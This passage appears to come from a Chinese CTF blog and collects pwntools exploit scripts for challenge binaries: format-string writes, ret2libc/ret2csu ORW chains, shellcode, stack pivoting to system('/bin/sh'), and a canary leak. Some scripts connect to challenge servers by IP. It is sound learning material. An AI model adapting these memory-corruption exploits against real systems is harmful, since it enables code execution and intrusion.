class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ⼤致流程就是fmt改返回地址改到mprotect，然后再修改mprotect的返回地址改到shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment"># io = remote(&quot;47.97.58.52&quot;, 43001)</span></span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;&quot;&quot;set context-output /dev/pts/5&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, script)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">what_addr = elf.symbols[<span class="string">&#x27;what&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;Say something:&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;deadbeef%6$p\x00&quot;</span></span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line">rbp_main = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">rbp = rbp_main - <span class="number">0x10</span></span><br><span class="line">ret1 = rbp + <span class="number">8</span></span><br><span class="line">ret2 = rbp + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;deadbeef%13$p\x00&quot;</span></span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">proc_base = main_addr - elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">what_addr = proc_base + elf.symbols[<span class="string">&#x27;what&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&quot;%&#123;&#125;c%11$hn\x00&quot;</span>.<span class="built_in">format</span>(ret1 &amp; <span class="number">0xffff</span>)</span><br><span class="line">io.sendafter(delim, payload3)</span><br><span class="line">payload4 = <span class="string">&quot;%&#123;&#125;c%39$hn\x00&quot;</span>.<span class="built_in">format</span>(what_addr &amp; <span class="number">0xffff</span>)</span><br><span class="line">io.sendafter(delim, payload4)</span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="number">0x114514030</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    payload3 = <span class="string">&quot;%&#123;&#125;c%11$hn\x00&quot;</span>.<span class="built_in">format</span>((ret2 + i * <span class="number">2</span>) &amp; <span class="number">0xffff</span>)</span><br><span class="line">    io.sendafter(delim, payload3)</span><br><span class="line">    payload4 = <span class="string">&quot;%&#123;&#125;c%39$hn\x00&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; (i * <span class="number">16</span>)) &amp; <span class="number">0xffff</span>)</span><br><span class="line">    io.sendafter(delim, payload4)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>) + shellcraft.read(<span class="number">3</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">payload5 = <span class="string">b&#x27;stop\x00&#x27;</span>.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>) + asm(shellcode)</span><br><span class="line">io.sendafter(delim, payload5)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>ORW + ret2libc + ret2csu</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./ret2libc_orw_x64&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&quot;set context-output /dev/pts/5&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">dofunc_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">delim = <span class="string">b&quot;input name:&quot;</span></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#------------------------------泄露libc地址-------------------------------------#</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4013e3</span></span><br><span class="line">padding = cyclic(<span class="number">16</span>)</span><br><span class="line">rdi = read_got</span><br><span class="line">ret = printf_plt</span><br><span class="line">payload = flat([padding, pop_rdi_ret, rdi, printf_plt, dofunc_addr]) <span class="comment"># 结尾放dofunc_addr做printf的ret来续命</span></span><br><span class="line">io.sendafter(delim, payload)</span><br><span class="line">io.recvline()</span><br><span class="line">read_libc = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = read_libc - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_libc = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_libc = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall_libc = libc_base + libc.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;read@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(read_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#--------------------------------输入&quot;/flag&quot;到.bss----------------------------#</span></span><br><span class="line"><span class="comment"># elf.bss() + 0x100 —▸ &quot;/flag&quot;</span></span><br><span class="line"><span class="comment"># elf.bss() + 0x100 + 0x10 —▸ syscall@libc 相当于是syscall的got</span></span><br><span class="line">STDIN = <span class="number">0</span></span><br><span class="line">csu1 = <span class="number">0x4013C0</span></span><br><span class="line">csu2 = <span class="number">0x4013DA</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span>                  <span class="comment"># rbp = rbx + 1 not jump</span></span><br><span class="line">r12 = STDIN              <span class="comment"># —▸ rdi</span></span><br><span class="line">r13 = elf.bss() + <span class="number">0x100</span>  <span class="comment"># —▸ rsi</span></span><br><span class="line">r14 = <span class="number">0x100</span>              <span class="comment"># —▸ rdx</span></span><br><span class="line">r15 = read_got           <span class="comment"># call [r15]</span></span><br><span class="line">padding2 = p64(<span class="number">0xdeadbeef</span>) * <span class="number">7</span> <span class="comment"># (add rsp, 8) + (pop * 6)</span></span><br><span class="line">payload = flat([padding, csu2, rbx, rbp, r12, r13, r14, r15, csu1, padding2, dofunc_addr]) <span class="comment"># 垫padding2和dofunc_addr继续续命</span></span><br><span class="line">io.sendafter(delim, payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b&quot;./flag\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(syscall_libc)) <span class="comment"># 将字符串放到指定位置，将syscall的地址放到自制的got中</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment">#--------------------------------ORW---------------------------------#</span></span><br><span class="line">O_RDWR = <span class="number">2</span></span><br><span class="line"><span class="comment"># pop_rdi_ret = 0x4013e3</span></span><br><span class="line"><span class="comment"># pop_rsi_r15_ret = 0x4013e1</span></span><br><span class="line"><span class="comment"># rdi = elf.bss()+0x100</span></span><br><span class="line"><span class="comment"># rsi = O_RDWR</span></span><br><span class="line"><span class="comment"># r15 = 0xdeadbeef</span></span><br><span class="line"><span class="comment"># open()函数用的是openat系统调用，这个不是open系统调用所以被禁掉了</span></span><br><span class="line"><span class="comment"># 用libc的syscall()函数来做open的系统调用</span></span><br><span class="line"><span class="comment"># 然后正常用csu调用read()和write()就行</span></span><br><span class="line">syscall_got = elf.bss() + <span class="number">0x100</span> + <span class="number">0x10</span></span><br><span class="line">csu1 = <span class="number">0x4013C0</span></span><br><span class="line">csu2 = <span class="number">0x4013DA</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span>                  <span class="comment"># rbp = rbx + 1 not jump</span></span><br><span class="line">r12 = constants.SYS_open <span class="comment"># —▸ rdi</span></span><br><span class="line">r13 = elf.bss() + <span class="number">0x100</span>  <span class="comment"># —▸ rsi</span></span><br><span class="line">r14 = O_RDWR             <span class="comment"># —▸ rdx</span></span><br><span class="line">r15 = syscall_got        <span class="comment"># call [r15]</span></span><br><span class="line">payload1 = flat([padding, csu2, rbx, rbp, r12, r13, r14, r15, csu1, padding2, csu2])</span><br><span class="line"></span><br><span class="line">flag_addr = elf.bss() + <span class="number">0x100</span> + <span class="number">0x50</span></span><br><span class="line">fd = <span class="number">3</span></span><br><span class="line">csu1 = <span class="number">0x4013C0</span></span><br><span class="line">csu2 = <span class="number">0x4013DA</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span>                 <span class="comment"># rbp = rbx + 1 not jump</span></span><br><span class="line">r12 = fd                <span class="comment"># —▸ rdi</span></span><br><span class="line">r13 = flag_addr         <span class="comment"># —▸ rsi</span></span><br><span class="line">r14 = <span class="number">0x100</span>             <span class="comment"># —▸ rdx</span></span><br><span class="line">r15 = read_got          <span class="comment"># call [r15]</span></span><br><span class="line">payload2 = flat([rbx, rbp, r12, r13, r14, r15, csu1, padding2, csu2])</span><br><span class="line"></span><br><span class="line">STDOUT = <span class="number">1</span></span><br><span class="line">csu1 = <span class="number">0x4013C0</span></span><br><span class="line">csu2 = <span class="number">0x4013DA</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span>                 <span class="comment"># rbp = rbx + 1 not jump</span></span><br><span class="line">r12 = STDOUT            <span class="comment"># —▸ rdi</span></span><br><span class="line">r13 = flag_addr         <span class="comment"># —▸ rsi</span></span><br><span class="line">r14 = <span class="number">0x100</span>             <span class="comment"># —▸ rdx</span></span><br><span class="line">r15 = write_got         <span class="comment"># call [r15]</span></span><br><span class="line">payload3 = flat([rbx, rbp, r12, r13, r14, r15, csu1, padding2, dofunc_addr])</span><br><span class="line">payload = payload1 + payload2 + payload3</span><br><span class="line">io.sendafter(delim, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>ret2shellcode + ORW</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">43010</span>)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;&quot;&quot;set context-output /dev/pts/6</span></span><br><span class="line"><span class="string">b *(&amp;main+298)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, script)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;Show me what you want to run: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(elf.got[<span class="string">&#x27;read&#x27;</span>] - (elf.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">300</span>)) <span class="comment"># 10733</span></span><br><span class="line">sh = <span class="string">&quot;&quot;&quot;xor edi, edi ; edi = STDIN</span></span><br><span class="line"><span class="string">mov esi, edx         ; edx = 0x20240000</span></span><br><span class="line"><span class="string">mov rax, [rsp]       ; [rsp] = &amp;main + 300</span></span><br><span class="line"><span class="string">add rax, 10733       ; rax = &amp;read@got</span></span><br><span class="line"><span class="string">call [rax]           ; call [read@got] &quot;&quot;&quot;</span></span><br><span class="line">io.sendafter(delim, asm(sh))</span><br><span class="line"></span><br><span class="line">sh1 = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>) + shellcraft.read(<span class="number">3</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>) <span class="comment"># 注意一下open的权限</span></span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x10</span> + asm(sh1)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>** </p><p><strong>泄露 + 栈迁移</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(pwnfile)</span><br><span class="line">io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">43001</span>)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;&quot;&quot;set context-output /dev/pts/5&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, script)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&#x27;vuln&#x27;</span>] <span class="comment"># 0x401205</span></span><br><span class="line">call_read_vuln = <span class="number">0x401211</span></span><br><span class="line">call_puts_vuln = <span class="number">0x401218</span></span><br><span class="line">buf_len = <span class="number">0x20</span></span><br><span class="line">leave_ret = <span class="number">0x401234</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4012c3</span></span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;Every doll has her fixed place,but not stack ~\n&quot;</span></span><br><span class="line"></span><br><span class="line">padding = cyclic(buf_len)</span><br><span class="line">rbp1 = elf.bss() + <span class="number">0x100</span></span><br><span class="line">rbp2 = <span class="number">0x404c00</span> + <span class="number">0x8</span> <span class="comment"># 一个空间很大不会影响其它地址的可写地址,而且还加了8绕过 movaps xmmword ptr [rsp + 0x50], xmm0 对齐检验</span></span><br><span class="line"></span><br><span class="line">payload1 = flat([padding, rbp1, call_read_vuln]) <span class="comment"># 重新回去布置rbp1的栈帧</span></span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rbp1栈帧</span></span><br><span class="line">payload2 = flat([rbp2, pop_rdi_ret, puts_got, call_puts_vuln, rbp1 - <span class="number">0x20</span>, leave_ret]) <span class="comment"># 在vuln中泄露got,这样既能puts又能再read一遍,布置rbp2的栈帧</span></span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line"></span><br><span class="line">puts_libc = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_libc - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(system_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp1 =&quot;</span>, <span class="built_in">hex</span>(rbp1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp2 =&quot;</span>, <span class="built_in">hex</span>(rbp2))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rbp2栈帧</span></span><br><span class="line">payload3 = flat([<span class="number">0xdeadbeef</span> , pop_rdi_ret, bin_sh_addr, system_libc, rbp2 - <span class="number">0x20</span>, leave_ret])</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>canary 绕过</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Canary 读取二次绕过</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwnfile&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6-i386_2.35-0ubuntu3.8_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(pwnfile) </span></span><br><span class="line">io = remote(<span class="string">&quot;101.200.155.151&quot;</span>, <span class="number">12400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># script = &quot;&quot;&quot;set context-output /dev/pts/7&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,script)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">setbuf_got = elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x080492C2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;read@got&gt;:&quot;</span>, <span class="built_in">hex</span>(read_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@got&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">fmtstr1 = <span class="string">b&quot;%9$s%1$p&quot;</span></span><br><span class="line">fmtstr1 = fmtstr1.ljust(((<span class="built_in">len</span>(fmtstr1) - <span class="number">1</span>) // <span class="number">4</span> + <span class="number">1</span>) * <span class="number">4</span>, <span class="string">b&#x27;\xaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">0x40</span> - <span class="built_in">len</span>(fmtstr1) - <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload1 = flat(fmtstr1, read_got, padding, <span class="string">b&quot;#&quot;</span>) <span class="comment"># 第一次读取canary,还没有触发栈溢出检查</span></span><br><span class="line"><span class="built_in">print</span>(payload1)</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line"></span><br><span class="line">read_libc = u32(io.recv(<span class="number">4</span>)) <span class="comment"># %s 输出地址字节</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>) <span class="comment"># %p 输出地址字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;read@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(read_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;buf@stack&gt;:&quot;</span>, <span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;#&quot;</span>)</span><br><span class="line">canary = u32(io.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]Canary:&quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_libc = read_libc + offset</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">padding1 = cyclic(<span class="number">0x40</span> - <span class="built_in">len</span>(bin_sh))</span><br><span class="line">padding2 = cyclic(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bin_sh_addr = read_libc + bin_sh_offset <span class="comment"># 本来可以用read写在栈上的,但是在system执行的过程中被栈被覆盖了</span></span><br><span class="line"><span class="comment"># 所以换成libc中的/bin/sh了</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(bin_sh, padding1, canary, padding2, system_libc, <span class="number">0xdeadbeef</span>, bin_sh_addr)</span><br><span class="line"><span class="comment"># 第二次改eip的时候提前知道了canary的值,就能在不改变canary的情况下实现栈溢出</span></span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>fmtstr + orw</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 